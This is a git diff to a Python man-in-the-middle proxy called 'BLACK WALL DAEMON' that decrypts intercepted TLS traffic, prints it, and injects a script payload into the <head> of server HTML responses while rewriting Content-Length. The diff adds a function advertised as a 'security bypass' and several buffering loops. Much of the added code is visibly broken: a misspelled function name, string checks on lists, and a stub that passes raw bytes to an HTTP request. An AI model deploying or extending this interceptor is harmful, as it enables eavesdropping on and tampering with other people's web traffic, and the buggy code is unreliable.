@@ -2,7 +2,7 @@ import socket
 from urllib.parse import urlparse
 import threading
 import select
-import os, subprocess, ssl, re
+import os, subprocess, ssl, re, requests
 
 HOST = '127.0.0.1'
 PORT = 8080
@@ -32,6 +32,9 @@ def listen():
         s_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s_socket.bind((HOST, PORT))
         s_socket.listen(5)
+        
+        
+        
         print(f"""\033[91m
  ╔════════════════════════════════════════════════════════════════════════════════╗
  ║                                                                                ║
@@ -46,10 +49,13 @@ def listen():
  ║                                                                                ║
  ║    >_ [ BLACK WALL DAEMON ] is running >:D                                     ║
  ║    >_ [ STATUS ] INTERCEPTING TRAFFIC...                                       ║
- ║    >_ [ LISTENING ON ] {HOST}:{PORT}                                           ║
+ ║    >_ [ LISTENING ON ] {HOST}:{PORT}                                          ║
  ║                                                                                ║
  ╚════════════════════════════════════════════════════════════════════════════════╝\033[0m
         """)
+
+
+
 
         while True:
             c_socket, c_address= s_socket.accept()
@@ -83,7 +89,14 @@ def daemon_blackwall(urlparsed, brute_data, c_socket, method, url_host, url_port
                 
                 for sock in readable:
                     if sock is c_ssl:
-                        brute_data = c_ssl.recv(4096)
+
+                        brute_data = []
+
+                        while not "\r\n\r\n" in brute_data:
+                            brute_data += c_ssl.recv(4096)
+
+                            brute_data = chunk_parser(brute_data)
+
                         print(f"[!!!!!unencrypted] {brute_data}")
                         if brute_data:
                             if b"Accept-Encoding" in brute_data:
@@ -97,7 +110,14 @@ def daemon_blackwall(urlparsed, brute_data, c_socket, method, url_host, url_port
                             return
 
                     elif sock is s_ssl:
-                        server_responce = s_ssl.recv(4096)
+
+                        server_responce = []
+
+                        while not "\r\n\r\n" in server_responce:
+                            server_responce += s_ssl.recv(4096)
+
+                        server_responce =ICE_s(server_responce)
+
                         print(f"[!!!!!unencrypted] {server_responce}")
                         if server_responce:
                             server_responce = inyect_ice(server_responce)
@@ -188,14 +208,28 @@ def inyect_ice(brute_package):
         brute_package = brute_package.replace(b"<head>", b"<head>" + ice_payload_bytes)
         brute_package = brute_package.replace(b"<HEAD>", b"<HEAD>" + ice_payload_bytes)
 
-    match = re.search(b"content-length: (\\d+)", brute_package, re.IGNORECASE)
+        match = re.search(b"content-length: (\\d+)", brute_package, re.IGNORECASE)
 
-    if match:
-        orig_length = int(match.group(1))
-        new_lenght = orig_length + len(ice_payload_bytes)
-        brute_package = re.sub(b"Content-Length: \\d+", f"Content-Length: {new_lenght}".encode(), brute_package, count=1, flags=re.IGNORECASE)
+        if match:
+            orig_length = int(match.group(1))
+            new_lenght = orig_length + len(ice_payload_bytes)
+            brute_package = re.sub(b"Content-Length: \\d+", f"Content-Length: {new_lenght}".encode(), brute_package, count=1, flags=re.IGNORECASE)
 
     return brute_package
+
+def ICE_s(server_responce):
+    match= re.search(b"Content-Type: [^\r\n]+\r\n", server_responce)
+    if match:
+        re.sub(b"Content-Type: [^\r\n]+\r\n", b"", server_responce, count=1, flags=re.IGNORECASE)
+        print("[!] Black Wall security bypass!!")
+        return server_responce
+    else:
+        return server_responce
+
+def chunk_paser(data):
+    with requests.get(data, stream=True) as answer:
+        answer 
+
 
 if __name__ == '__main__':
     try:
